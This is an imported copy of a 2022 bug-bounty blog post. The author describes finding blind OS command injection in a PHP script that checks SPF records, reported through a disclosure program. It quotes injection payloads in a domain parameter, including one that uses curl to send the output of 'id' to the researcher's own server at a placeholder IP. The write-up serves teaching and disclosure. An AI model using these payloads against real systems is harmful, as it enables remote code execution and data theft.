---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-08-21_blind-command-injection.md
original_filename: 2022-08-21_blind-command-injection.md
title: Blind command injection
category: documents
detected_topics:
- command-injection
- sso
- otp
tags:
- imported
- documents
- command-injection
- sso
- otp
language: en
raw_sha256: de2132901cc7f527b6403b7c09c37e22fdaf3b24eee1fb8051535c4e95ee1bc8
text_sha256: 560a9d59e29cf678ebb237b1e51a1c11608eeb8d60a373798182eed28e0563ba
ingested_at: '2026-06-28T07:32:13Z'
sensitivity: unknown
redactions_applied: false
---

# Blind command injection

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-08-21_blind-command-injection.md
- Source Type: markdown
- Detected Topics: command-injection, sso, otp
- Ingested At: 2026-06-28T07:32:13Z
- Redactions Applied: False
- Raw SHA256: `de2132901cc7f527b6403b7c09c37e22fdaf3b24eee1fb8051535c4e95ee1bc8`
- Text SHA256: `560a9d59e29cf678ebb237b1e51a1c11608eeb8d60a373798182eed28e0563ba`


## Content

---
title: "Blind command injection"
page_title: "Blind os command injection - Bergee's Stories on Bug Hunting"
url: "https://bergee.it/blog/blind-command-injection/"
final_url: "https://bergee.it/blog/blind-command-injection/"
authors: ["Bartłomiej Bergier (@_bergee_)"]
bugs: ["RCE", "OS command injection"]
publication_date: "2022-08-21"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2281
---

# Blind os command injection

Posted on [2022-08-212026-04-27](https://bergee.it/blog/blind-command-injection/) by [bergee](https://bergee.it/blog/author/bergee/)

Hi dear readers. This story is about how to find command injection, which leads to RCE getting “Thank you” in return :).

I was hunting on one target I found via google dork. There was a functionality that was checking SPF records of the given domain. To clarify, a sender policy framework (SPF) record is a type of DNS TXT record that lists all the servers authorized to send emails from a particular domain. You can read more about it [here](https://www.cloudflare.com/learning/dns/dns-records/dns-spf-record/). So I started Burp and examined the request responsible for checking the domain. This was the request :

> GET /script.php?domain=mydomain.com

Simple as that. I thought what if the script runs external shell command such as _host_ or _dig_ with the given domain as the parameter. I tried some command injections payloads such as:

> GET /script.php?domain=mydomain.com;id

> GET /script.php?domain=mydomain.com id

But haven’t got the command output in the response just the PHP errors. After some more trials and errors, I decided to go for blind command injection. What if the command is actually executed in the backend, but no output is printed out. I checked that with curl command which connected with my own server. I added “a” parameter with $(id) value to the GET request. This way the output of the id command was sent with curl command as the value of parameter “a” to my server running at 1.2.3.4 on port 8888 So the final request was:

> GET /script.php?domain=mydomain.com;curl%201.2.3.4:8888?a=$(id)

Yep, I used also google.com domain for testing as google is good for everything 🙂

[  
![](https://bergee.it/blog/wp-content/uploads/2022/08/burp_request_redacted-1-1024x559.png)  
](https://bergee.it/blog/wp-content/uploads/2022/08/burp_request_redacted-1.png)

Bingo! This is what I saw in the response:

![](https://bergee.it/blog/wp-content/uploads/2022/08/confirmed_rce_redacted.png)

This was blind command injection as the command output was not seen in the response. Lesson learned – even if the script returns errors and there is no command output in response it does not mean it is not being executed. So this bug leads us to RCE (remote command execution), so this is game over :). As this was VDP program that promised some token of appreciation for serious bugs (I think RCE is serious enough), all I got in return was a “Thank you” e-mail. However, knowledge is always priceless.

See you next bug 🙂
